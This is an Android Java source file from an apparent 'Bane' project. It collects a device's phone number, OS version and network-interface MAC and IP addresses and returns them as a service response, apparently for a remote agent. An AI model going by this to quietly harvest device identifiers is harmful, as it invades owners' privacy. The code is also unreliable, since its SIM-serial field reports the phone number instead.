package com.example.bane.bane.sysinfo;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;
import com.bane.model.BaneCode;
import com.bane.model.BaneObject;
import com.bane.model.BaneValue;
import com.example.bane.BaneService;

import java.net.InetAddress;
import java.net.InterfaceAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;

public class SysInfo {

    public static BaneObject sysinfo(){
        TelephonyManager tMgr = (TelephonyManager) BaneService.context.getSystemService(Context.TELEPHONY_SERVICE);
        String phoneNumber = tMgr.getLine1Number();
        String simSerial = tMgr.getSimSerialNumber();
        String androidOS = Build.VERSION.RELEASE;
        String cards = "";
        try {
            Enumeration<NetworkInterface> nics = NetworkInterface.getNetworkInterfaces();
            while(nics.hasMoreElements()){
                NetworkInterface nic = nics.nextElement();
                cards += "{\n";
                cards += "\tnetcard name: " + nic.getName() + ",\n";
                cards += "\tvirtual netinterface: " + nic.isVirtual() + ",\n";

                if(nic.getHardwareAddress() != null){
                    cards += "\thw address: ";
                    for(byte b : nic.getHardwareAddress()){
                        cards += String.format("%02x:", b);
                    }
                    cards += ",\n";
                }
                List<InetAddress> inetAddresses = Collections.list(nic.getInetAddresses());
                cards += "\tinet addresses: " + inetAddresses.toString() + ",\n";
                cards += "\tinterfaces: " + nic.getInterfaceAddresses().toString() + "\n";

                cards += "},";

            }
            cards = cards.substring(0,cards.length()-1);
        } catch (Exception e) {
            e.printStackTrace();
        }

        return new BaneObject(BaneCode.RESPONSE,"",new BaneValue[]{
                new BaneValue<String>("simserial","Sim Serial Code: "+phoneNumber),
                new BaneValue<String>("phoneNumber","Phone Number: "+phoneNumber),
                new BaneValue<String>("os", "OS Version: " + androidOS),
                new BaneValue<String>("netcards", cards)
        });
    }

}
